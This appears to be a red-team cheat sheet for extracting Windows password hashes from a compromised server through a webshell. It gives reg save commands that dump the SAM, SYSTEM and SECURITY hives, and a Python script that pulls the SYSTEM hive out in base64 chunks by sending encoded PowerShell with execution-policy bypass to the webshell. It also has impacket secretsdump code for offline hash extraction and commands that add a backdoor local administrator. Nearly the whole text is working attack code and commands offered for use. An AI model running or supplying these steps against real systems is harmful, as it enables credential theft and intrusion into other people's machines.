# Windows Hash Exfiltration via Webshell

When you have SYSTEM RCE via webshell but SMB is filtered from attacker host.

## Save Registry Hives

```
reg save HKLM\SAM C:\Windows\Temp\sam /y
reg save HKLM\SYSTEM C:\Windows\Temp\system /y
reg save HKLM\SECURITY C:\Windows\Temp\security /y
```

## Transfer via Base64 Chunks (PowerShell)

SAM is small (~60KB) — single certutil encode works:
```
certutil -encode C:\Windows\Temp\sam C:\Windows\Temp\sam.b64
```
Then fetch via webshell HTTP response.

SYSTEM is large (15-20MB) — must chunk via PowerShell:

```python
import subprocess, base64

chunk_size = 500000  # 500KB per request
total_size = 18518016  # from file size query
all_data = b""

for i in range((total_size // chunk_size) + 1):
    offset = i * chunk_size
    length = min(chunk_size, total_size - offset)
    if length <= 0:
        break
    # URL-encode the PowerShell command
    cmd = (f"curl -sk --max-time 120 "
           f"'http://TARGET:8080/shell/cmd.jsp?cmd=powershell+-ep+bypass+-c+"
           f"%22%24bytes%3D%5BIO.File%5D%3A%3AReadAllBytes(%27C%3A%5CWindows%5CTemp%5Csystem%27)"
           f"%3B%5BConvert%5D%3A%3AToBase64String(%24bytes%2C{offset}%2C{length})%22'")
    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=130)
    b64_data = result.stdout.decode().strip().replace('\r\n', '').replace('\n', '')
    all_data += base64.b64decode(b64_data)

with open("system.bin", "wb") as f:
    f.write(all_data)
```

## Offline Hash Extraction (impacket)

```python
from impacket.examples.secretsdump import LocalOperations, SAMHashes

local_ops = LocalOperations("system.bin")
boot_key = local_ops.getBootKey()
sam = SAMHashes("sam.bin", boot_key)
sam.dump()
sam.finish()
```

## Alternative: Create Temp Admin + secretsdump

If SMB is reachable from attacker:
```
net user tmpAdmin P@ss1234 /add
net localgroup Administrators tmpAdmin /add
```
Then: `secretsdump.py 'tmpAdmin:P@ss1234@TARGET'`

**Cleanup after:** `net user tmpAdmin /delete`

## Pitfalls
- SYSTEM hive is 15-20MB on Server 2022 — too large for single HTTP response
- `certutil -encode` on SYSTEM produces 25MB+ base64 — webshell response may truncate
- SMB (445) often filtered between subnets even when HTTP works
- Always verify chunk count: `total_size // chunk_size + 1`
- impacket install: `pip3 install impacket` (module is `impacket.examples.secretsdump`)
